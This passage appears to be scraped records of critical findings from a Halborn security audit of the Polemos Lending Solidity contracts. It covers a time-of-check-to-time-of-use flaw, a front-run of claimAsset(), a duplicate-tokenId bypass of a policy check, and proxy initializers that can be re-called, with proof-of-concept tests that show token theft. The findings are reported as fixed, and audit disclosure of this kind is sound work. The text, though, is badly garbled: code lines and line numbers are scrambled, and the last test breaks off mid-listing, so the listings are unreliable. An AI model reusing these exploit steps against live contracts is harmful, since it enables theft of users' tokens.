Contract Audits/Polemos_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The solution implements rental wallets that are under the custody of the Polemos team. Each rental wallet is assigned to each borrower individ- ually. After a successful asset claim, the rented asset is transferred to the rental wallet. Furthermore, the borrower can transfer owned to- kens to the rental wallet. The borrower can manage the rental wallet off-chain, however, the list of possible actions is strictly limited. E.g., the borrower can transfer out any owned tokens from the rental wallet, but transferring the rented asset is forbidden. To check which action is allowed or prohibited, in before any action, the solution calls the checkPolicy() function from the RentalAutomator contract. The checkPolicy() function makes necessary checks, including the rental wal- let tokens balances and rental balances from RentedStats structure, to decide e.g., if a transfer of only owned tokens is allowed, and returns RentalCheckResult and emits RentalPolicyChecked event. Basing on the result and event emitted, the solution can decide about triggering the transfer. However, having in mind the asynchronous nature of the blockchain, the checkPolicy() function can be vulnerable to time-of-check-to-time-of-use Multiple subsequent calls to the checkPolicy() function with issue. operation type set to Transfer_Erc20 may return a success state. Then, the solution-backend triggers multiple transfer transactions, not being aware that the rental wallet balance was changed between transactions. As an example, consider the below scenario: 1. The borrower borrows 50 rental tokens. 2. The borrower transfers another 50 tokens to the rental wallet. 27 3. The borrower triggers an attempt to transfer 50 owned tokens to the external wallet twice, then:  checkPolicy() for the first transfer pass  checkPolicy() for the second transfer pass as well (the total balance is still 100, the claimed balance is 50)  the custodian performs first transfer of 50 tokens  the custodian performs second transfer of 50 tokens As a result, the malicious user used the time-of-check-to-time-of-use vulnerability to steal rented tokens. The vulnerability is related to the rental tokens of type ERC20 and ERC1155. The Polemos team confirmed that this issue is possible without additional backend validation. Code Location: Listing 1: LibRentalPolicyCheck.sol (Lines 256,291) 247 function _checkErc20Transfer ( uint256 totalBalance , 248 uint256 claimedBalance , 249 250 uint256 txBalance 251 252 ) private pure returns ( RentalCheckResult memory ) { // status : the given operation is applied to Claimed or  Reclaimed asset 253 254 if ( claimedBalance > 0) { // allow to \" transfer \" / \" transfer - from when user has  enough own tokens to cover tx - amount 255 // ( this means success when asset is Claimed /  Reclaimed and user has enough non - rented tokens ) 256 257 258 259 260 if ( totalBalance - claimedBalance >= txBalance ) { return RentalCheckResult ( true , PolicyCheckResponseCode .  Checked_When_Erc20_Operation_With_Own_Tokens ); 261 262 263 264 } else { return RentalCheckResult ( 28 265 266 false , PolicyCheckResponseCode .  Not_Checked_When_Erc20_Operation 267 268 269 270 ); } } else { // Allow to \" transfer \" / \" transfer - from \" for Staked or  Unstaked asset 271 272 // or for unknown asset for Automator . // ( this means success when user tries to transfer own  tokens , tokens he is approved to spend , // or tokens not intersting for Automator ) return RentalCheckResult ( true , PolicyCheckResponseCode .  Checked_When_Erc20_Operation_With_Own_Tokens 278 279 280 281 282 283 284 285 286 287 ); } } function _checkErc1155Transfer ( uint256 totalBalance , uint256 claimedBalance , uint256 txBalance ) private pure returns ( RentalCheckResult memory ) { // status : the given operation is applied to Claimed or  Reclaimed asset 288 289 if ( claimedBalance > 0) { // allow to \" safeBatchTransferFrom \" / \"  safeTransferFrom \" when user has enough own tokens to cover tx -  amount 290 // ( this means success when asset is Claimed /  Reclaimed and user has enough non - rented tokens ) 291 292 293 294 295 if ( totalBalance - claimedBalance >= txBalance ) { return RentalCheckResult ( true , PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens ); 273 274 275 276 277 296 297 298 299 } else { return RentalCheckResult ( 29 300 301 false , PolicyCheckResponseCode .  Not_Checked_When_Erc1155_Operation 302 303 304 305 ); } } else { // Allow to \" safe - batch - transfer - from \" / \" safe -  transfer - from \" for Staked or Unstaked asset 306 307 // or for unknown asset for Automator . // ( this means success when user tries to transfer own  tokens , tokens he is approved to spend , 308 309 310 311 312 // or tokens not intersting for Automator ) return RentalCheckResult ( true , PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens 313 314 315 } } ); Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to ensure that the backend custodian service is trig- gering transactions for rental wallet synchronously, e.g., by queuing. Alternatively, it is recommended to combine both the check policy busi- ness logic with the transfer operation for rental wallet into a single smart contract function, thus, making it atomic. Remediation Plan: SOLVED: The Polemos team solved this issue in commit 4bbbcb7941556e7486b691cb58b811733a02d2d1: the checkPolicy() function is now disabled for all operation types related to transfer of ERC20, ERC721 30 or ERC1155 tokens. Instead, a new transferFromRentalWallet() function is introduced, that handles both checkPolicy() functionality and transfer of tokens in a single transaction. 31 ", "labels": ["Halborn", "Polemos_Lending", "Severity: Critical"]}, {"title": "CLAIMASSET CAN BE FRONT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polemos_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The solution implements rental wallets that are under the custody of the Polemos team. Each rental wallet is assigned to each borrower individu- ally. After a successful asset claim, the rented asset is transferred to the rental wallet. Furthermore, the borrower can transfer owned tokens The borrower can manage the rental wallet off- to the rental wallet. chain, however, the list of possible actions is strictly limited. E.g., the borrower can transfer out any owned tokens from the rental wallet, but transferring the rented asset is forbidden. To check which action is allowed or prohibited, in before any action, the solution calls the checkPolicy() function from RentalAutomator. The checkPolicy() function makes necessary checks, including the rental wallet tokens balances and rental balances from RentedStats structure, to decide e.g., if a transfer of only owned tokens is allowed, and returns RentalCheckResult and emits RentalPolicyChecked event. Basing on the result and event emitted, the solution can decide about triggering the transfer. The _checkErc20Transfer() function determines if the transfer of owned tokens is allowed. However, if there are no rental tokens in the rental wallet (the claimedBalance parameter is zero) then the solution allows transferring any amount of owned tokens, without checking the actual balance. Thus, it is possible to trigger transfer of tokens, which are currently not in possession. Eventually, a malicious user can trigger both claimAsset() and checkPolicy() for token transfer simultaneously. Assuming that claimAsset() executes after the checkPolicy() it transfers Then, subsequent transfer of tokens the rental tokens to the wallet. triggered by the backend will transfer rental tokens out from the wallet, as it was previously approved via the checkPolicy(). 32 As an example, consider the below scenario: 1. The borrower registers a new rental wallet. 2. The lender stakes an amount of ERC20 token, e.g., XYZ token. 3. The borrower triggers in solution-backend the token transfer from rental wallet for amount of XYZ tokens from step 2. 4. Simultaneously, the borrower calls claimAsset() for the lenders XYZ tokens from step 2 immediately. 5. The checkPolicy() call initiated within step 3 returns a positive result. 6. The claimAsset() call finishes and transfers rental tokens to the borrowers rental wallet. 7. The solution-backend receives the result of the checkPolicy() call from step 5 and proceeds with token transfer received in step 6. As a result, the malicious user used the front-run vulnerability to steal rented tokens. The vulnerability is related to the rental tokens of type ERC20 and ERC1155. Code Location: Listing 278,288,304,309-313) 2: LibRentalPolicyCheck.sol (Lines 253,269,274- 247 function _checkErc20Transfer ( uint256 totalBalance , 248 uint256 claimedBalance , 249 uint256 txBalance 250 251 252 ) private pure returns ( RentalCheckResult memory ) { // status : the given operation is applied to Claimed or  Reclaimed asset 253 254 if ( claimedBalance > 0) { // allow to \" transfer \" / \" transfer - from when user has  enough own tokens to cover tx - amount 255 // ( this means success when asset is Claimed /  Reclaimed and user has enough non - rented tokens ) 256 257 258 259 if ( totalBalance - claimedBalance >= txBalance ) { return RentalCheckResult ( true , 33 260 PolicyCheckResponseCode .  Checked_When_Erc20_Operation_With_Own_Tokens ); } else { return RentalCheckResult ( false , PolicyCheckResponseCode .  Not_Checked_When_Erc20_Operation 267 268 269 270 ); } } else { // Allow to \" transfer \" / \" transfer - from \" for Staked or  Unstaked asset 271 272 // or for unknown asset for Automator . // ( this means success when user tries to transfer own  tokens , tokens he is approved to spend , // or tokens not intersting for Automator ) return RentalCheckResult ( true , PolicyCheckResponseCode .  Checked_When_Erc20_Operation_With_Own_Tokens 261 262 263 264 265 266 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 ); } } function _checkErc1155Transfer ( uint256 totalBalance , uint256 claimedBalance , uint256 txBalance ) private pure returns ( RentalCheckResult memory ) { // status : the given operation is applied to Claimed or  Reclaimed asset 288 289 if ( claimedBalance > 0) { // allow to \" safeBatchTransferFrom \" / \"  safeTransferFrom \" when user has enough own tokens to cover tx -  amount 290 // ( this means success when asset is Claimed /  Reclaimed and user has enough non - rented tokens ) 291 292 293 294 if ( totalBalance - claimedBalance >= txBalance ) { return RentalCheckResult ( true , 34 295 PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens ); } else { return RentalCheckResult ( false , PolicyCheckResponseCode . 296 297 298 299 300 301  Not_Checked_When_Erc1155_Operation 302 303 304 305 ); } } else { // Allow to \" safe - batch - transfer - from \" / \" safe -  transfer - from \" for Staked or Unstaked asset 306 307 // or for unknown asset for Automator . // ( this means success when user tries to transfer own  tokens , tokens he is approved to spend , 308 309 310 311 312 // or tokens not intersting for Automator ) return RentalCheckResult ( true , PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens 313 314 315 } } ); Proof of Concept: The below unit test confirms the possibility of triggering checkPolicy() for any amount of tokens while not having claimed tokens positive balance. Listing 3: HalbornERC20CheckPolicyTest.t.sol function 1  test_checkPolicy_for_transfer_ERC20_with_empty_balance () public { 2 3 4 5 6  RentalPolicyArguments ( uint256 [] memory Ids = new uint256 [](1) ; uint256 [] memory ammounts = new uint256 [](1) ; Ids [0] = 0; ammounts [0] = 10 e10 ; RentalPolicyArguments memory rentalPolicyArguments = 35 address ( mockErc20Token ) , Ids , borrower1 , borrowerExternal1 , ammounts , address (0) , true , address (0) , OperationType . Transfer_Erc20 7 8 9 10 11 12 13 14 15 16 17 18 ( RentalCheckResult memory rentalCheckResult ) =  rentalAutomator . checkPolicy ( rentalPolicyArguments , AssetType . EIP20  ); 19 20  PolicyCheckResponseCode .  Checked_When_Erc20_Operation_With_Own_Tokens )) ; 21 assertEq ( rentalCheckResult . success , true ); assertEq ( uint ( rentalCheckResult . resultCode ) , uint ( ); } Risk Level: Likelihood - 5 36 Impact - 5 Recommendation: It is recommended to verify the amount and balance of the triggered tokens transfer by the borrower within the checkPolicy() function when no rental tokens are present in the rental wallet. Remediation Plan: SOLVED: The Polemos team solved this issue in commit 4bbbcb7941556e7486b691cb58b811733a02d2d1: the _checkErc20Transfer() and the _checkErc1155Transfer() functions are now checking the rental wallet balances in every case. Furthermore, the checkPolicy() function is now disabled for all operation types related to transfer of ERC20, ERC721 or ERC1155 tokens. Instead, a new transferFromRentalWallet() function is introduced, that handles both checkPolicy() functionality and transfer of tokens in a single transaction. 37 ", "labels": ["Halborn", "Polemos_Lending", "Severity: Critical"]}, {"title": "CHECKPOLICY BYPASS FOR SAFEBATCHTRANSFERFROM ERC1155 IS POSSIBLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polemos_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The solution implements rental wallets that are under the custody of the Polemos team. Each rental wallet is assigned to each borrower individ- ually. After a successful asset claim, the rented asset is transferred to the rental wallet. Furthermore, the borrower can transfer owned to- The borrower can manage the rental wallet kens to the rental wallet. off-chain, however, the list of possible actions is strictly limited. E.g., the borrower can transfer out any owned tokens from the rental wallet, but transferring the rented asset is forbidden. To check which action is allowed or prohibited, in before any action, the solution calls the checkPolicy() function from RentalAutomator. The checkPolicy() makes necessary checks, including the rental wallet tokens balances and rental balances from RentedStats structure, to decide e.g., if a transfer of only owned tokens is allowed, and returns RentalCheckResult and emits RentalPolicyChecked event. Basing on the result and event emitted, the solution can decide about triggering the transfer. The _applyErc1155Rules() and _checkErc1155Transfer() functions determine if the batch transfer of owned tokens is allowed. The batch transfer, defined as SafeBatchTransferFrom_Erc1155 operation type, allows transfer- ring multiple ERC1155 tokens with provided amounts at once. However, as the _checkErc1155Transfer() function checks the rental wallets balances, the _applyErc1155Rules() function does not check if RentalPolicyArguments .tokenIds contains distinct values. Therefore, it is possible to provide one tokenId multiple times with the amount set up-to owned tokens balance. Furthermore, the OpenZeppelins implementation of safeBatchTransferFrom () does not check user input against distinct values. Ultimately, this vulnerability can be abused to bypass the checkPolicy() restrictions and trigger the batch transfer that includes all rental tokens. 38 As an example, consider the below scenario: 1. The borrower register new rental wallet. 2. The lender stakes an amount of ERC1155 token, e.g., 10 tokens of tokenId=1. 3. The borrower borrows ERC1155 tokens. 4. The borrower transfers owned tokens to the rental wallet with the same tokenId=1 and amount=10. Note that the rental wallet has now total balance equal to 20. 5. The borrower triggers in solution-backend the batch token trans- fer from rental wallet for tokenId=1. The RentalPolicyArguments. tokenIds is set to [1, 1] and RentalPolicyArguments.amounts is set to [10, 10]. Note that tokenIds contains duplicate ids. 6. Observe that the checkPolicy() transactions finishes successfully. 7. The solution-backend triggers safeBatchTransferFrom() for 20 tokens in total. As a result, the malicious user abused the weakness in ERC1155 token validation to transfer out rental tokens from the rental wallet. Code Location: Listing 4: LibRentalPolicyCheck.sol (Lines 195-200) 165 function _applyErc1155Rules ( 166 167 168 169 170 171 172 OperationType erc1155Operation , uint256 [] memory rentalWalletTotalBalances , uint256 [] memory rentalWalletClaimedBalances , RentalPolicyArguments memory args , address automatorAddress ) private pure returns ( RentalCheckResult memory ) { // method \" set - approval - for - all \" is prohibited , unless  operator is the Automator 173 if ( erc1155Operation == OperationType .  SetApprovalForAll_Erc1155 ) { 174 if ( args . operatorOrSpender == automatorAddress && args  . approved ) { 175 176 return RentalCheckResult ( true ,  PolicyCheckResponseCode . Checked_When_Erc1155_Operation ); 39 177 178 179 180 181 } return RentalCheckResult ( false , PolicyCheckResponseCode .  Not_Checked_When_Erc1155_Operation 182 183 184 185 ); } // this is required to return the most accurate result in  case of safe - transfer operation 186 if ( erc1155Operation == OperationType .  SafeTransferFrom_Erc1155 ) { 187 188 189 190 191 192 193 194 195 196  ( 197 198 199 200 201 202 return _checkErc1155Transfer ( rentalWalletTotalBalances [0] , rentalWalletClaimedBalances [0] , args . amounts [0] ); } for ( uint256 i = 0; i < args . tokenIds . length ; i ++) { RentalCheckResult memory check = _checkErc1155Transfer rentalWalletTotalBalances [ i ], rentalWalletClaimedBalances [i ], args . amounts [ i] ); // if there is not_checked result , then we should  break the cycle and return with suitable result 203 if ( check . resultCode == PolicyCheckResponseCode .  Not_Checked_When_Erc1155_Operation ) { 204 205 206 207 return RentalCheckResult ( false , PolicyCheckResponseCode .  Not_Checked_When_Erc1155_Operation 208 209 210 211 212 213 ); } } return RentalCheckResult ( true , 40 214 PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens 215 216 } ); Listing 5: LibRentalPolicyCheck.sol (Line 291) 282 function _checkErc1155Transfer ( 283 284 285 286 287 uint256 totalBalance , uint256 claimedBalance , uint256 txBalance ) private pure returns ( RentalCheckResult memory ) { // status : the given operation is applied to Claimed or  Reclaimed asset 288 289 if ( claimedBalance > 0) { // allow to \" safeBatchTransferFrom \" / \"  safeTransferFrom \" when user has enough own tokens to cover tx -  amount 290 // ( this means success when asset is Claimed /  Reclaimed and user has enough non - rented tokens ) 291 292 293 294 295 if ( totalBalance - claimedBalance >= txBalance ) { return RentalCheckResult ( true , PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens ); 296 297 298 299 300 301 } else { return RentalCheckResult ( false , PolicyCheckResponseCode .  Not_Checked_When_Erc1155_Operation 302 303 304 305 ); } } else { // Allow to \" safe - batch - transfer - from \" / \" safe -  transfer - from \" for Staked or Unstaked asset 306 307 // or for unknown asset for Automator . // ( this means success when user tries to transfer own  tokens , tokens he is approved to spend , 308 309 310 // or tokens not intersting for Automator ) return RentalCheckResult ( 41 311 312 true , PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens 313 314 315 } } ); Proof of Concept: unit test below confirms The the the checkPolicy() with duplicate entries in the RentalPolicyArguments. Furthermore, the same possibility is proven for tokenIds collection. safeBatchTransferFrom(). possibility triggering of Listing 6: HalbornERC1155CheckPolicyTest.t.sol claimAssetFromLenderToBorrowerERC1155 () ; // mint 10 tokens to borrower1 , so he has 20; 10 owned mockErc1155Token . mint ( borrower1 , 1, 10) ; uint256 [] memory Ids = new uint256 [](2) ; uint256 [] memory ammounts = new uint256 [](2) ; Ids [0] = 1; ammounts [0] = 10; Ids [1] = 1; ammounts [1] = 10; RentalPolicyArguments memory rentalPolicyArguments = 1 function  test_checkPolicy_ERC1155_SafeBatchTransferFrom_with_same_tokenId ()  public { 2 3 4 5 6 7 8 9 10 11 12 13  RentalPolicyArguments ( 14 15 16 17 18 19 20 21 22 23 address ( mockErc1155Token ) , Ids , borrower1 , borrowerExternal1 , ammounts , address ( rentalAutomator ) , true , address (0) , OperationType . SafeBatchTransferFrom_Erc1155 ); 42 vm . prank ( borrower1 ); ( RentalCheckResult memory rentalCheckResult ) = assertEq ( rentalCheckResult . success , true ); assertEq ( uint ( rentalCheckResult . resultCode ) , uint ( 24 25 26  rentalAutomator . checkPolicy ( rentalPolicyArguments , AssetType .  EIP1155 ); 27 28  PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens )); 29 30 31  0) ; 32 33 34  borrowerExternal1 , Ids , ammounts , data ); 35 36  20) ; } 37 bytes memory data ; vm . prank ( borrower1 ); mockErc1155Token . safeBatchTransferFrom ( borrower1 , assertEq ( mockErc1155Token . balanceOf ( borrower1 , 1) , 0) ; assertEq ( mockErc1155Token . balanceOf ( borrowerExternal1 , 1) , assertEq ( mockErc1155Token . balanceOf ( borrower1 , 1) , 20) ; assertEq ( mockErc1155Token . balanceOf ( borrowerExternal1 , 1) , Risk Level: Likelihood - 5 Impact - 5 43 Recommendation: It is recommended to verify whether the RentalPolicyArguments.tokenIds collection contains only distinct ids for SafeBatchTransferFrom_Erc1155 operation type within the checkPolicy() function. Remediation Plan: SOLVED: The Polemos team solved this issue in commit the validateTokensIdsList() 4bbbcb7941556e7486b691cb58b811733a02d2d1: function call is now introduced in the body of the _preparePolicyCheckData () function. The validation verifies whether tokenIds are unique. 44 ", "labels": ["Halborn", "Polemos_Lending", "Severity: Critical"]}, {"title": "DIAMOND PROXY INITIALIZE FUNCTIONS CAN BE CALLED MULTIPLE TIMES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polemos_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "as is revealed proxy proxy diamond the solution solution implements assumes The upgradeability pattern. firstly that The then initialize functions are called from each facet. the assessment that and multiple initalizeAuthenticatedUpgradabilityModule() times. Both functions can be abused to take the contracts ownership. In contrary, initializeRentalAutomator() from the RentalAutomatorFacet can be called only once, as it turns on the isInitialized property within the _initEip712Config(). However, initializeRentalAdminFacet() be deployed, called can the Code Location: Listing 7: RentalAuthenticatedUpgradabilityFacet.sol storage facetStorage = getAuthentificationFacetStorage function initalizeAuthenticatedUpgradabilityModule ( address [] DiamondStorage storage ds = state () ; RentalAuthenticatedUpgradabilityFacetStorage 69  calldata adminUserList ) external { 70 71 72 73  () ; 74 require (! facetStorage . isInitialized ,  AUTHENTICATED_UPGRADABILITY_FACET_ALREADY_INITIALIZED ); 75  INVALID_ADMIN_LIST_LENGTH_ERR ); 76  DUPLICATED_ADMIN_USERS_ERR ); 77 78 79 80 81 address currentAdmin = adminUserList [ i ]; ds . adminList . _isAdmin [ currentAdmin ] = true ; ds . adminList . addresses . push ( currentAdmin ); for ( uint8 i ; i < MAX_ADMINS_COUNT ; ++ i) { require ( adminUserList . length == MAX_ADMINS_COUNT , _validateListContainsUniqueItemsWithErr ( adminUserList , 45 82 83 } } Listing 8: RentalAdminFacet.sol function initializeRentalAdminFacet () external { RentalAdminFacetStorage storage facetStorage = require (! facetStorage . isInitialized , 68 69  getAdminFacetStorage () ; 70  ADMIN_FACET_ALREADY_INITIALIZED ); 71 72 73 74 } DiamondStorage storage ds = state () ; ds . adminAddress = msg . sender ; Listing 9: RentalAutomatorFacet.sol (Line 62) LibRentalParamValidator . validateAddressNotNullWithError ( ); validateContractSupportsErc20Interface ( DiamondStorage storage ds = state () ; address _feeTokenContractAddress , string memory _eip721DomainName ) external { _feeTokenContractAddress , USDC_ADDRESS_IS_NILL_ERR 40 function initializeRentalAutomator ( 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56  _feeTokenContractAddress ); 57 58 59 60 61  is appended and inited 62  address ( this ))); publicUtils () , _feeTokenContractAddress , address ( this ) ); ds . feeTokenContractInstance = IERC20 ( ds . defaultReclaimPeriod = DEFAULT_RECLAIM_PERIOD ; ds . minRentalPeriod = MIN_RENTAL_PERIOD ; ds . maxRentalPeriod = MAX_RENTAL_PERIOD ; // note : make sure this is invoked after recoverable facet _initEip712Config ( _eip721DomainName , IBaseRecoverable ( 46 63 } Listing 10: Eip712ConfigFacet.sol (Line 33) function _initEip712Config ( string memory _domainName , Eip712ConfigFacetStorage storage facetStorage = require (! facetStorage . isInitialized , DiamondStorage storage ds = state () ; ds . domainName = _domainName ; 20  IBaseRecoverable recoverable ) internal { 21  getEip712FacetStorage () ; 22  EIP712_CONFIG_FACET_ALREADY_INITIALIZED ); 23 24 25 26 27  buildDomainSeparator ( 28 29 30 31 32 33 34 _domainName , VERSION , address ( this ) facetStorage . isInitialized = true ; ); } ds . cachedDomainSeparator = recoverable . Proof of Concept: unit tests below confirm The the initializeRentalAdminFacet() and initalizeAuthenticatedUpgradabilityModule () functions multiple times, whereas initializeRentalAutomator can be called only once. possibility triggering the of Listing 11: HalbornDiamondProxyTests.t.sol 1 2 3 4 5 6 7 8 function setUp () public { (...) rentalDiamondLoupeFacet = new RentalDiamondLoupeFacet () ; rentalAdminFacet = new RentalAdminFacet () ; rentalRecoverableFacet = new RentalRecoverableFacet () ; publicUtilsFacet = new PublicUtilsFacet () ; rentalAutomatorFacet = new RentalAutomatorFacet () ; 47 rentalPolicyHandlerFacet = new RentalPolicyHandlerFacet () ; rentalAutomatorFacet = new RentalAutomatorFacet () ; rentalAssetHandlerFacet = new RentalAssetHandlerFacet () ; rentalAuthenticatedUpgradabilityFacet = new address ( rentalDiamondLoupeFacet ) , FacetCutAction . Add , generateSelectors (\" RentalDiamondLoupeFacet \") FacetCutWithoutInitData [] memory cut = new cut [0] = FacetCutWithoutInitData ( address ( rentalAdminFacet ) , FacetCutAction . Add , generateSelectors (\" RentalAdminFacet \" ) ); cut [2] = FacetCutWithoutInitData ( ); cut [1] = FacetCutWithoutInitData ( 9 10 11 12  RentalAuthenticatedUpgradabilityFacet () ; 13 14  FacetCutWithoutInitData [](8) ; 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 ); cut [4] = FacetCutWithoutInitData ( ); cut [6] = FacetCutWithoutInitData ( ); cut [5] = FacetCutWithoutInitData ( ); address ( rentalRecoverableFacet ) , FacetCutAction . Add , generateSelectors (\" RentalRecoverableFacet \" ) ); cut [3] = FacetCutWithoutInitData ( address ( publicUtilsFacet ) , FacetCutAction . Add , generateSelectors (\" PublicUtilsFacet \" ) address ( rentalPolicyHandlerFacet ) , FacetCutAction . Add , generateSelectors (\" RentalPolicyHandlerFacet \" ) address ( rentalAssetHandlerFacet ) , FacetCutAction . Add , generateSelectors (\" RentalAssetHandlerFacet \") address ( rentalAutomatorFacet ) , FacetCutAction . Add , generateSelectors (\" RentalAutomatorFacet \") 48 ); cut [7] = FacetCutWithoutInitData ( address [] memory temp = new address [](3) ; RentalAutomatorFacet ( address ( rentalAutomatorProxy )) . rentalAutomatorProxy = new RentalAutomatorProxy ( cut ); temp [0] = address ( owner ); temp [1] = address ( owner2 ); temp [2] = address ( owner3 ); address ( rentalAuthenticatedUpgradabilityFacet ) , FacetCutAction . Add , generateSelectors (\" 51 52 53 54  RentalAuthenticatedUpgradabilityFacet \") 55 56 57 58 59  initializeRentalAutomator ( address ( mockUSDToken ) , domainName ); 60 61 62 63 64 65 66 RentalAuthenticatedUpgradabilityFacet ( address ( 67  rentalAutomatorProxy )) . initalizeAuthenticatedUpgradabilityModule (  temp ); 68 69  initializeRentalAdminFacet () ; 70 71 72 73  public { 74 75 76  initializeRentalAutomator ( address ( mockUSDToken ) , domainName ); 77 78 79  test_diamond_proxy_initalizeAuthenticatedUpgradabilityModule_twice  () public { 80 81 82 83 84 85 vm . prank ( attacker1 ); vm . expectRevert ( bytes (\" AC -012 \")) ; RentalAutomatorFacet ( address ( rentalAutomatorProxy )) . temp [0] = address ( attacker1 ); temp [1] = address ( attacker2 ); temp [2] = address ( attacker3 ); function test_diamond_proxy_initializeRentalAutomator_twice () RentalAdminFacet ( address ( rentalAutomatorProxy )) . address [] memory temp = new address [](3) ; function (...) } } 49 } vm . prank ( attacker1 ); 86 87 RentalAuthenticatedUpgradabilityFacet ( address (  rentalAutomatorProxy )) . initalizeAuthenticatedUpgradabilityModule (  temp ); 88 89 90  public { 91 92  initializeRentalAdminFacet () ; 93 vm . prank ( attacker1 ); RentalAdminFacet ( address ( rentalAutomatorProxy )) . function test_diamond_proxy_initializeRentalAdminFacet_twice () } Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to turn on the isInitialized property within the initializeRentalAdminFacet() and initalizeAuthenticatedUpgradabilityModule () functions call. Remediation Plan: SOLVED: The Polemos team solved this issue in commit cf0d83cd8d859d41e0059954d2d9be1bd2a2dd7e: the initializeRentalAdminFacet () and initalizeAuthenticatedUpgradabilityModule() functions now turn on the isInitialized property. 50 ", "labels": ["Halborn", "Polemos_Lending", "Severity: Critical"]}, {"title": "TRANSFERFROMRENTALWALLET BYPASS FOR SAFETRANSFERFROM ERC1155 IS POSSIBLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Polemos_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The solution implements rental wallets that are under the custody of the Polemos team. Each rental wallet is assigned to each borrower individu- ally. After a successful asset claim, the rented asset is transferred to the rental wallet. Furthermore, the borrower can transfer owned tokens to the rental wallet. The borrower can manage the rental wallet off-chain, E.g., the however, the list of possible actions is strictly limited. borrower can transfer out any owned tokens from the rental wallet, but transferring the rented asset is forbidden. The transferFromRentalWallet () function is now available to the user, to manage owned and rental tokens within the rental wallet. struct. The assessment revealed that transferFromRentalWallet() with operation type set to SafeTransferFrom can be abused to steal ERC1155 rental tokens. The _applyErc1155Rules() function within the _checkPolicy() function only checks the first record of amounts collection from RentalPolicyArguments Thus, it does not check if more records were provided. Additionally, the transferFromRentalWalletERC1155() function performs _doERC1155Transfer() for every record of amounts and Ids collections for both SafeTransferFrom and SafeBatchTransferFrom operation types. These two implementation characteristics allow the attacker to provider mul- tiple records for amounts and Ids collections and force transfer of the rental tokens. 51 Code Location: Listing 12: LibRentalPolicyCheck.sol (Lines 186-193) 165 function _applyErc1155Rules ( 166 167 168 169 170 171 172 OperationType erc1155Operation , uint256 [] memory rentalWalletTotalBalances , uint256 [] memory rentalWalletClaimedBalances , RentalPolicyArguments memory args , address automatorAddress ) private pure returns ( RentalCheckResult memory ) { // method \" set - approval - for - all \" is prohibited , unless  operator is the Automator 173 if ( erc1155Operation == OperationType .  SetApprovalForAll_Erc1155 ) { 174 if ( args . operatorOrSpender == automatorAddress && args  . approved ) { 175 176 return RentalCheckResult ( true ,  PolicyCheckResponseCode . Checked_When_Erc1155_Operation ); 177 178 179 180 181 } return RentalCheckResult ( false , PolicyCheckResponseCode .  Not_Checked_When_Erc1155_Operation 182 183 184 185 ); } // this is required to return the most accurate result in  case of safe - transfer operation 186 if ( erc1155Operation == OperationType .  SafeTransferFrom_Erc1155 ) { 187 188 189 190 191 192 193 194 195 196  ( 197 return _checkErc1155Transfer ( rentalWalletTotalBalances [0] , rentalWalletClaimedBalances [0] , args . amounts [0] ); } for ( uint256 i ; i < args . tokenIds . length ; i ++) { RentalCheckResult memory check = _checkErc1155Transfer rentalWalletTotalBalances [ i ], 52 198 199 200 201 202 rentalWalletClaimedBalances [i ], args . amounts [ i] ); // if there is not_checked result , then we should  break the cycle and return with suitable result 203 if ( check . resultCode == PolicyCheckResponseCode .  Not_Checked_When_Erc1155_Operation ) { 204 205 206 207 return RentalCheckResult ( false , PolicyCheckResponseCode .  Not_Checked_When_Erc1155_Operation 208 209 210 211 212 213 214 ); } } return RentalCheckResult ( true , PolicyCheckResponseCode .  Checked_When_Erc1155_Operation_With_Own_Tokens 215 216 } ); Listing 13: LibRentalTransferUtils.sol 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 function transferFromRentalWalletERC1155 ( address tokenContract , address from , address to , uint256 [] memory amounts , uint256 [] memory tokenIds ) internal { // note : real batch - transfer not supported IERC1155 assetContract = IERC1155 ( tokenContract ); for ( uint i; i < amounts . length ; ++ i) { _doERC1155Transfer ( assetContract , from , to , tokenIds [ i ], amounts [i ], DEFAULT_ERC1155_OWNERSHIP_ERR , DEFAULT_ERC1155_APPROVAL_ERR 53 121 122 123 ); } } Proof of Concept: unit test confirms below transferFromRentalWallet() The triggering of possibility the with multiple the entries RentalPolicyArguments.amounts and RentalPolicyArguments.tokenIds collections and operation type set to SafeTransferFrom that results in all tokens transfers. the in Listing 14: HalbornERC1155CheckPolicyTest.t.sol claimAssetFromLenderToBorrowerERC1155 () ; vm . prank ( borrower1 ); mockErc1155Token . setApprovalForAll ( address ( uint256 [] memory Ids = new uint256 [](2) ; uint256 [] memory ammounts = new uint256 [](2) ; Ids [0] = 2; ammounts [0] = 0; Ids [1] = 1; ammounts [1] = 10; 1 function  test_transferFromRentalWallet_SafeTransferFrom_ERC1155_bypass ()  public { 2 3 4 5  rentalAutomatorProxy ) , true ); 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 TRANSFER_FROM_RENTAL_TYPEHASH , mockErc1155Token , borrower1 , borrowerExternal1 , keccak256 ( abi . encodePacked ( Ids )) , keccak256 ( abi . encodePacked ( ammounts )) , 